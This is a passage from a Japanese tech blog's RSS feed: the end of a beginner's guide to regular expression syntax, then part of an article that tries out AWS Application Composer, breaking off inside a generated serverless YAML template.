      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>こんにちは、2022年4月入社・流通製造グループ所属の高世です。</p><p><a href="/articles/20230417a/">春の入門ブログ連載</a>の14日目です。</p><p>みなさん、正規表現は使っていますか？</p><p>正規表現とはテキストデータの検索やパターンマッチングに用いれるツールで、様々な場所で使用することができます。身近なところだとテキストエディタ(VSCodeなど)などで使用可能で、通常の文字列検索・置換よりも柔軟で効率的な作業を可能とします。</p><p>この記事では「正規表現は聞いたことあるけど何ができるかよくわからない」という方や「使っているけど毎回調べてコピーしている」という方向けに、基本的なものから少し高度な構文まで例文も合わせて紹介したいと思います。</p><h2 id="正規表現チェッカーサイト"><a href="#正規表現チェッカーサイト" class="headerlink" title="正規表現チェッカーサイト"></a>正規表現チェッカーサイト</h2><p>正規表現を作成する際、指定した文章とマッチするか・構文として誤っていないかをチェックしながら作成すると効率的です。</p><p>その際にWeb上で正規表現をチェックしてくれるサイトがあるので、おすすめを2つ紹介します。</p><ul><li><a href="https://weblabo.oscasierra.net/tools/regex/">正規表現チェッカー</a><br>正規表現・対象文字列に対して、どうマッチするか結果を表示してくれます。<br>表示が見やすいので本記事ではこちらのサイトの結果のスクショを貼っています。</li><li><a href="https://www.debuggex.com/">Debuggex: Online visual regex tester</a><br>上記のサイト同様、正規表現によるマッチの結果の表示に加えて、作成した正規表現をビジュアライズしてくれます。<br>デバッグを行うとき便利です！</li></ul><h2 id="基本的な正規表現文法"><a href="#基本的な正規表現文法" class="headerlink" title="基本的な正規表現文法"></a>基本的な正規表現文法</h2><div class="scroll"><table><thead><tr><th>正規表現</th><th>意味</th></tr></thead><tbody><tr><td>.</td><td>任意の１文字</td></tr><tr><td>[]</td><td>角括弧に含まれるいずれか１文字（<code>[abc]</code>の場合、a,b,cのいずれか）</td></tr><tr><td>*</td><td>0回以上の繰り返し</td></tr><tr><td>+</td><td>1回以上の繰り返し</td></tr><tr><td>?</td><td>0回か1回</td></tr><tr><td>{N}</td><td>N回の繰り返し</td></tr><tr><td>{N,M}</td><td>N回以上、M回以下の繰り返し</td></tr><tr><td>^</td><td>行の先頭</td></tr><tr><td>$</td><td>行の末尾</td></tr><tr><td>\d</td><td>数字 [0-9]</td></tr><tr><td>\w</td><td>英数字とアンダーバー [0-9a-zA-Z_]</td></tr><tr><td>\s</td><td>空白文字 [ \f\n\r\t\v]</td></tr><tr><td>(?&#x3D;)</td><td>肯定先読み（指定した文字列の先頭にマッチ）</td></tr><tr><td>(?&lt;&#x3D;)</td><td>肯定後読み（指定した文字列の末尾にマッチ）</td></tr></tbody></table></div><p>以下ではそれぞれの構文について、コード例も載せながら紹介していきます。</p><h3 id="任意の1文字【-】"><a href="#任意の1文字【-】" class="headerlink" title="任意の1文字【.】"></a>任意の1文字【.】</h3><p>ドット【.】は任意の1文字を表します。<br>任意の文字数をマッチさせたいときは【.】を繰り返します。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F....e</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image.png" alt="image.png" width="925" height="360" loading="lazy"><p>上記の例では、ドット【.】を4回繰り返すことで<code>Future</code>の<code>utur</code>部分を表しています。<br>任意の4文字にマッチするため、<code>Figure</code>や<code>Fiddle</code>などにもマッチします。</p><h3 id="いずれかの1文字【-】"><a href="#いずれかの1文字【-】" class="headerlink" title="いずれかの1文字【[]】"></a>いずれかの1文字【[]】</h3><p>角括弧【[]】の内部に記述された文字からいずれかの1文字とマッチします。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F[ABC]</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_2.png" alt="image.png" width="919" height="352" loading="lazy"><p>上記の例では<code>[ABC]</code>という正規表現が<code>A</code>か<code>B</code>か<code>C</code>のいずれかを表します。</p><h4 id="範囲指定【-】"><a href="#範囲指定【-】" class="headerlink" title="範囲指定【-】"></a>範囲指定【-】</h4><p>例えば0~9の数値のいずれか1文字をマッチさせたい場合、単純に<code>[0123456789]</code>と記述することもできますが、ハイフン【-】を使用することで<code>[0-9]</code>と短縮できます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">201[0-9]年</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_3.png" alt="image.png" width="920" height="357" loading="lazy"><p>以下の表のようにアルファベットでも同様に範囲指定できます。</p><div class="scroll"><table><thead><tr><th>範囲指定の正規表現</th><th>意味</th></tr></thead><tbody><tr><td>[0-9]</td><td>0から9までの数値</td></tr><tr><td>[a-z]</td><td>aからzまでの小文字のアルファベット</td></tr><tr><td>[A-Z]</td><td>AからZまでの大文字のアルファベット</td></tr></tbody></table></div><p>また、数値とアルファベットのいずれかにマッチさせたい場合<code>[0-9a-zA-Z]</code>と組み合わせることで表現できます。</p><h3 id="複数パターンのいずれかにマッチ【-】"><a href="#複数パターンのいずれかにマッチ【-】" class="headerlink" title="複数パターンのいずれかにマッチ【|】"></a>複数パターンのいずれかにマッチ【|】</h3><p>縦棒【|】を使用することで【|】で区切られた複数のパターンのいずれかの文字列にマッチします。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(2020|令和2)年</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_4.png" alt="image.png" width="918" height="360" loading="lazy"><p><code>()</code>でグループ化することでパターンの中で選択する部分を指定できるようになります。<br>【|】の優先順位が低いため <code>2020|令和2年</code> というパターンの場合は <code>2020</code> または <code>令和2年</code> にマッチします。上記例のように【()】でグループ化するとグループ内に限定でき、 <code>2020年</code> または <code>令和2年</code> にマッチするようになります。</p><h3 id="直前の文字の繰り返し【-】"><a href="#直前の文字の繰り返し【-】" class="headerlink" title="直前の文字の繰り返し【*+?】"></a>直前の文字の繰り返し【*+?】</h3><p>【*+?】はそれぞれ、下記のように繰り返しを表します。</p><div class="scroll"><table><thead><tr><th>繰り返しの正規表現</th><th>意味</th></tr></thead><tbody><tr><td>*</td><td>0回以上の繰り返し</td></tr><tr><td>+</td><td>1回以上の繰り返し</td></tr><tr><td>?</td><td>0回か1回</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o+</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_5.png" alt="image.png" width="911" height="353" loading="lazy"><p><code>o+</code>と記述することで<code>o</code>が1回以上繰り返されている箇所にマッチします。ちなみに単なる <code>*</code> <code>+</code> <code>?</code> は繰り返しが最大になるようにマッチします。</p><p>最小量指定子 <code>*?</code> <code>+?</code> <code>??</code> を用いることで繰り返しが最小の文字列と合致させることもできます。詳細は<a href="https://www.javadrive.jp/regex-basic/writing/index1.html">こちら</a>を参照してください。</p><h4 id="繰り返しの回数指定【-N-N-M-】"><a href="#繰り返しの回数指定【-N-N-M-】" class="headerlink" title="繰り返しの回数指定【{N},{N,M}】"></a>繰り返しの回数指定【{N},{N,M}】</h4><p><code>*</code>や<code>+</code>では繰り返されうる最大の文字列と合致してしまいますが、繰り返しの回数を制限することも可能です。</p><p>こちらは波括弧を用いて【{N},{N,M}】と記述します。</p><div class="scroll"><table><thead><tr><th>回数指定ができる繰り返しの正規表現</th><th>意味</th></tr></thead><tbody><tr><td>{N}</td><td>N回の繰り返し</td></tr><tr><td>{N,M}</td><td>N回以上、M回以下の繰り返し</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o&#123;3&#125;</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_6.png" alt="image.png" width="924" height="357" loading="lazy"><h3 id="行の先頭・末尾を指定【-】"><a href="#行の先頭・末尾を指定【-】" class="headerlink" title="行の先頭・末尾を指定【^,$】"></a>行の先頭・末尾を指定【^,$】</h3><p>ハット【^】は行の先頭、ドルマーク【$】は行の末尾を表します。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">^Future</span><br><span class="line">Future$</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_7.png" alt="image.png" width="921" height="356" loading="lazy"><img src="/images/20230510a/image_8.png" alt="image.png" width="917" height="359" loading="lazy"><p>ハット【^】を正規表現の先頭に記述することで行の先頭に<code>Future</code>の記載があるもののみがマッチします。<br>ドルマーク【$】はその逆で末尾に記述することで、行末の<code>Future</code>のみにマッチします。<br>ハット【^】とドルマーク【$】がそれぞれ、行頭・行末を位置を表していると考えるとわかりやすいですね。</p><h3 id="【-】を使用した略記法"><a href="#【-】を使用した略記法" class="headerlink" title="【\】を使用した略記法"></a>【\】を使用した略記法</h3><p>環境にもよりますが、バックスラッシュ【\】に特定の文字を組み合わせることで、特定の文字集合を表すことができます。</p><div class="scroll"><table><thead><tr><th>【\】を使用した正規表現の略記法</th><th>意味</th></tr></thead><tbody><tr><td>\d</td><td>数字 [0-9]</td></tr><tr><td>\w</td><td>英数字とアンダーバー [0-9a-zA-Z_]</td></tr><tr><td>\s</td><td>空白文字 [ \f\n\r\t\v]</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">090-\d&#123;4&#125;-\d&#123;4&#125;</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_9.png" alt="image.png" width="915" height="357" loading="lazy"><p>上記の正規表現では携帯電話の番号を正規表現に表したものです。<br>繰り返し表現と合わせることで、アルファベットが混入した行や、文字数が足りない行を排除することが出来ています。<br>また前述した<code>[0-9]</code>という記法よりも、短く視認性も良くなっています。</p><h3 id="先読み・後読み【-x3D-lt-x3D-】"><a href="#先読み・後読み【-x3D-lt-x3D-】" class="headerlink" title="先読み・後読み【(?&#x3D;),(?&lt;&#x3D;)】"></a>先読み・後読み【(?&#x3D;),(?&lt;&#x3D;)】</h3><p>上記で紹介した正規表現では対象の文字列にマッチするかどうか・マッチする箇所があるかないかをチェックしますが、例えばマッチした文字列以前・以降の文字列を取得したい場合など、これから紹介する先読み・後読みが使用できます！</p><h4 id="肯定先読み【-x3D-】"><a href="#肯定先読み【-x3D-】" class="headerlink" title="肯定先読み【(?&#x3D;)】"></a>肯定先読み【(?&#x3D;)】</h4><p>肯定先読みは【(?&#x3D;xxx)】と記述し、xxxにマッチした文字列の先頭位置にマッチします。<br>言葉では分かりづらいので具体例を見ると、下記のような<code>〇〇Script</code>という文字列から<code>Script</code>以前の文字列（<code>Java</code>や<code>Type</code>）などとマッチさせたい場合に使用できます。</p><blockquote><p>JavaScript<br>TypeScript<br>CoffeeScript</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.*(?=Script)</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_10.png" alt="image.png" width="914" height="357" loading="lazy"><p><code>Script</code>以前の文字列（<code>Java</code>,<code>Type</code>,<code>Coffee</code>）を取得することができました。<br>肯定先読みを使用することで、上記のような単純にパターンマッチで取得できないような文字列を抽出することができます。</p><h4 id="肯定後読み【-lt-x3D-】"><a href="#肯定後読み【-lt-x3D-】" class="headerlink" title="肯定後読み【(?&lt;&#x3D;)】"></a>肯定後読み【(?&lt;&#x3D;)】</h4><p>肯定先読みではマッチした文字列の先頭位置にマッチしましたが、肯定後読みではその逆で文末にマッチします。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?&lt;=Future).*</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_11.png" alt="image.png" width="919" height="350" loading="lazy"><p>上記の正規表現では、<code>Future</code>という文字列の後ろの位置にマッチしそこから<code>.*</code>で残りの文字列にマッチさせています。</p><h4 id="肯定先読み・後読みを組み合わせた例"><a href="#肯定先読み・後読みを組み合わせた例" class="headerlink" title="肯定先読み・後読みを組み合わせた例"></a>肯定先読み・後読みを組み合わせた例</h4><p>最後に補足で肯定先読み・後読みを組み合わせた例を紹介します。<br>2つを組み合わせることで、特定の文字列で囲まれた文字列を抽出することができます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?&lt;=Future).*(?=Inc)</span><br></pre></td></tr></table></figure><img src="/images/20230510a/image_12.png" alt="image.png" width="916" height="351" loading="lazy"><p><code>Future</code>と<code>Inc</code>に囲まれた<code>Architect</code>を抽出することができました。</p><h2 id="おわりに"><a href="#おわりに" class="headerlink" title="おわりに"></a>おわりに</h2><p>正規表現をマスターすることで、日々の文章を扱うような作業を効率化できます。</p><p>注意点として、本記事で紹介した正規表現の構文は個人的に使う頻度が高いと思うものを選んでいるため、こちらが全量ではありません。また環境によって使用できる正規表現が異なる場合があるため気をつける必要があります。</p><p>最後に紹介した先読み・後読みの正規表現が記述できることで、表現の幅が広がると思うので存在だけでも覚えていただけたら嬉しいです。正規表現を使用することで、日々の作業の生産性を向上させて行きましょう！</p><p>明日の入門記事は栗栖さんの<a href="/articles/20230512a/">OS自作入門本に触れたのでOS起動までの処理概要をまとめてみた</a>です！</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Programming/">Programming</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%85%A5%E9%96%80/">入門</category>
      
      <category domain="https://future-architect.github.io/tags/%E5%88%9D%E5%BF%83%E8%80%85%E5%90%91%E3%81%91/">初心者向け</category>
      
      <category domain="https://future-architect.github.io/tags/%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE/">正規表現</category>
      
      
      <comments>https://future-architect.github.io/articles/20230510a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AWS Application Composerを使ってみた！</title>
      <link>https://future-architect.github.io/articles/20230509a/</link>
      <guid>https://future-architect.github.io/articles/20230509a/</guid>
      <pubDate>Mon, 08 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;あいさつ&quot;&gt;&lt;a href=&quot;#あいさつ&quot; class=&quot;headerlink&quot; title=&quot;あいさつ&quot;&gt;&lt;/a&gt;あいさつ&lt;/h2&gt;&lt;p&gt;こんにちは。金融グループ所属の佐藤です。&lt;br&gt;&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="あいさつ"><a href="#あいさつ" class="headerlink" title="あいさつ"></a>あいさつ</h2><p>こんにちは。金融グループ所属の佐藤です。<br><a href="/articles/20230417a/">春の入門祭り</a>の13日目の記事となります。</p><p>2023&#x2F;03&#x2F;07から一般提供が開始された新サービス「AWS Application Composer」を使ってみて、どんな人向けか、強み・弱みは何かというところを見ていきます。</p><h2 id="AWS-Application-Composerとは？"><a href="#AWS-Application-Composerとは？" class="headerlink" title="AWS Application Composerとは？"></a>AWS Application Composerとは？</h2><p>以下、公式の概要文です。（引用元: <a href="https://console.aws.amazon.com/composer/home">Application Composer | ホーム</a>）</p><blockquote><p>AWS Application Composer は、サーバーレスアプリケーションのアーキテクチャ設定、構築の合理化と高速化を支援します。<br>シンプルなドラッグアンドドロップのワークフローを使用して、アプリケーションのデプロイに必要な構成が自動的に生成されます。<br>Infrastructure as Code は、AWS CloudFormation と AWS サーバーレスアプリケーションモデルをベースにしています。</p></blockquote><p>ざっくりまとめると、</p><ul><li>AWSサービスを用いた <strong>アーキテクチャの構築を支援</strong> するよ</li><li><strong>ドラッグアンドドロップ</strong> を使って直感的に操作ができるよ</li><li>裏側ではCFnとSAMを使ってるから <strong>テンプレートを共有</strong> できるよ</li></ul><p>と書いていて、特に2つ目のドラッグアンドドロップができるよ！というのがキャッチコピーとなっています。</p><p>具体的には以下の画像のように、あるサービスから別のサービスを呼びます、というのをより視覚的に、直感的に表現することができます。</p><img src="/images/20230509a/スクリーンショット_2023-05-07_23.07.19.png" alt="" width="1200" height="453" loading="lazy"><p>※ドラッグアンドドロップでサービスを配置して、サービス同士を線で繋いでいくイメージ</p><h2 id="サービスの特徴"><a href="#サービスの特徴" class="headerlink" title="サービスの特徴"></a>サービスの特徴</h2><h3 id="コストについて"><a href="#コストについて" class="headerlink" title="コストについて"></a>コストについて</h3><p>以下、公式のQ＆Aです。(引用元：<a href="https://aws.amazon.com/jp/application-composer/faq">FAQ</a>)</p><blockquote><p>Q: AWS Application Composer にはどの程度のコストがかかりますか?<br>AWS Application Composer は追加料金なしで使用できます。<br>手動で作成した場合と同じ方法で、AWS Application Composer を使用して作成された AWS リソース (S3 バケットや Lambda 関数など) の料金をお支払いいただきます。<br>実際に使用した分の料金のみをお支払いいただきます。<br>最低料金や前払いの義務は発生しません。</p></blockquote><p>ということで、Application Composerを使ったからと言って<strong>追加の料金は掛からない</strong>とのことでした。</p><h3 id="対応しているサービス"><a href="#対応しているサービス" class="headerlink" title="対応しているサービス"></a>対応しているサービス</h3><p>現時点でGUI上で確認できるサービスは以下です。</p><img src="/images/20230509a/スクリーンショット_2023-05-07_23.37.44.png" alt="" width="1200" height="651" loading="lazy"><p>※API gateway &#x2F; Cognito UserPool &#x2F; Cognito UserPoolClient &#x2F; DynamoDB Table &#x2F; EventBridge Event rule &#x2F; EventBridge Schedule &#x2F; Kinesis Stream &#x2F; Lambda Function &#x2F; Lambda Layer &#x2F; S3 Bucket &#x2F; SNS Topic &#x2F; SQS Queue &#x2F; Step Functions State machine</p><p>ということで基本的なサービスは揃っているため、<strong>シンプルな構成では困らなさそう</strong>という印象でした。<br>一方、ここにないサービスを使いたい場合はこれだけで完結させることは出来ないため、Application Composerを使うか検討している人は要チェックです。</p><h4 id="使えるリージョン"><a href="#使えるリージョン" class="headerlink" title="使えるリージョン"></a>使えるリージョン</h4><p>現在利用できるリージョンは以下。</p><ul><li>米国東部 (オハイオ)</li><li>米国東部 (バージニア北部)</li><li>米国西部 (オレゴン)</li><li>アジアパシフィック (シンガポール)</li><li>アジアパシフィック (シドニー)</li><li>アジアパシフィック (東京)</li><li>欧州 (フランクフルト)</li><li>欧州 (アイルランド)</li><li>欧州 (ストックホルム)</li></ul><p>ということで、東京リージョンやコストの安い米国各地域のリージョンが入っているので、リソースの配置場所に<strong>特殊な要件がない場合は特に困らなさそう</strong>と思いました。</p><h2 id="どんな人向け？"><a href="#どんな人向け？" class="headerlink" title="どんな人向け？"></a>どんな人向け？</h2><p>ここまでをまとめると、</p><ul><li>直感的に操作できる</li><li>追加コストはなし</li><li>主要サービスは使える</li><li>主要地域で使える</li></ul><p>という特徴がApplication Composerにはあると分かったため、個人的に</p><ul><li>シンプルな構成のサービスを爆速で作りたい人</li><li>AWSインフラの構築練習をしてみたい人</li></ul><p>あたりにオススメなのかなと思いました。<br>良くも悪くも想定された構成であれば<strong>非常に楽に</strong>インフラ構築ができるため、前者ではスピード感、後者では手軽さに繋がると思い抜擢してみました。</p><h2 id="実際に使ってみた"><a href="#実際に使ってみた" class="headerlink" title="実際に使ってみた"></a>実際に使ってみた</h2><p>…と、長々特徴について語ってしまいましたが、ここから実際に触ってみて使い勝手や感想を述べてみようかと思います。</p><h4 id="やりたい構成"><a href="#やりたい構成" class="headerlink" title="やりたい構成"></a>やりたい構成</h4><p>以下のようなSPAを使ったwebアプリを想定して作ってみようと思います。<br><img src="/images/20230509a/スクリーンショット_2023-05-09_1.02.00.png" alt="スクリーンショット_2023-05-09_1.02.00.png" width="520" height="431" loading="lazy"></p><h4 id="やってみた"><a href="#やってみた" class="headerlink" title="やってみた"></a>やってみた</h4><ol><li><p>まずはAWSコンソールの検索窓で<code>Application Composer</code>と検索</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.48.43.png" alt="スクリーンショット_2023-05-09_1.48.43.png" width="1200" height="611" loading="lazy"></li><li><p>Application Composerのホーム画面が開けました</p><img src="/images/20230509a/スクリーンショット_2023-05-08_0.33.05.png" alt="スクリーンショット_2023-05-08_0.33.05.png" width="1200" height="615" loading="lazy"></li><li><p><code>プロジェクトの作成</code>を押下して、もろもろの設定をして空のプロジェクトを<code>Create</code>してみます</p><img src="/images/20230509a/スクリーンショット_2023-05-08_0.32.47.png" alt="スクリーンショット_2023-05-08_0.32.47.png" width="1200" height="615" loading="lazy"></li><li><p>編集画面っぽいのが開けました</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.03.16.png" alt="スクリーンショット_2023-05-09_1.03.16.png" width="1200" height="611" loading="lazy"></li><li><p><code>やりたい構成</code>を見つつ、左のメニューからリソースを雑にドラッグアンドドロップしましょう</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.18.55.png" alt="スクリーンショット_2023-05-09_1.18.55.png" width="1200" height="611" loading="lazy"></li><li><p>論理IDを設定してよりそれっぽくします</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.26.39.png" alt="スクリーンショット_2023-05-09_1.26.39.png" width="1200" height="611" loading="lazy"></li><li><p>APIgatewayの中身が寂しかったのでAuthorizer(認可)とエンドポイントの設定を追加します</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.31.59.png" alt="スクリーンショット_2023-05-09_1.31.59.png" width="1200" height="611" loading="lazy"></li><li><p>再度<code>やりたい構成</code>を見て、アクセスを許可したいリソース同士を線で繋ぎます</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.34.49.png" alt="スクリーンショット_2023-05-09_1.34.49.png" width="1200" height="611" loading="lazy"></li><li><p>見た目が汚いので<code>Arrange</code>ボタンを押して整形します</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.36.28.png" alt="スクリーンショット_2023-05-09_1.36.28.png" width="1200" height="611" loading="lazy"></li><li><p>あっという間にこれで完成です。最後にTemplateを押して出来上がったテンプレートを見てみましょう</p><img src="/images/20230509a/スクリーンショット_2023-05-09_1.38.04.png" alt="スクリーンショット_2023-05-09_1.38.04.png" width="1200" height="611" loading="lazy"></li></ol><p>※全文は長いので折りたたみで添付しておきます（見たい人向け）。クリックしてください。</p><details><summary>作成したテンプレート</summary><div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Transform:</span> <span class="string">AWS::Serverless-2016-10-31</span></span><br><span class="line"><span class="attr">Resources:</span></span><br><span class="line">  <span class="attr">uploadFugaFile:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Serverless::Function</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Description:</span> <span class="type">!Sub</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Stack</span> <span class="string">$&#123;AWS::StackName&#125;</span> <span class="string">Function</span> <span class="string">$&#123;ResourceName&#125;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">ResourceName:</span> <span class="string">uploadFugaFile</span></span><br><span class="line">      <span class="attr">CodeUri:</span> <span class="string">src/Function2</span></span><br><span class="line">      <span class="attr">Handler:</span> <span class="string">index.handler</span></span><br><span class="line">      <span class="attr">Runtime:</span> <span class="string">nodejs18.x</span></span><br><span class="line">      <span class="attr">MemorySize:</span> <span class="number">3008</span></span><br><span class="line">      <span class="attr">Timeout:</span> <span class="number">30</span></span><br><span class="line">      <span class="attr">Tracing:</span> <span class="string">Active</span></span><br><span class="line">      <span class="attr">Events:</span></span><br><span class="line">        <span class="attr">awesomeApiPOSTapifugasupload:</span></span><br><span class="line">          <span class="attr">Type:</span> <span class="string">Api</span></span><br><span class="line">          <span class="attr">Properties:</span></span><br><span class="line">            <span class="attr">Path:</span> <span class="string">/api/fugas/upload</span></span><br><span class="line">            <span class="attr">Method:</span> <span class="string">POST</span></span><br><span class="line">            <span class="attr">RestApiId:</span> <span class="type">!Ref</span> <span class="string">awesomeApi</span></span><br><span class="line">      <span class="attr">Environment:</span></span><br><span class="line">        <span class="attr">Variables:</span></span><br><span class="line">          <span 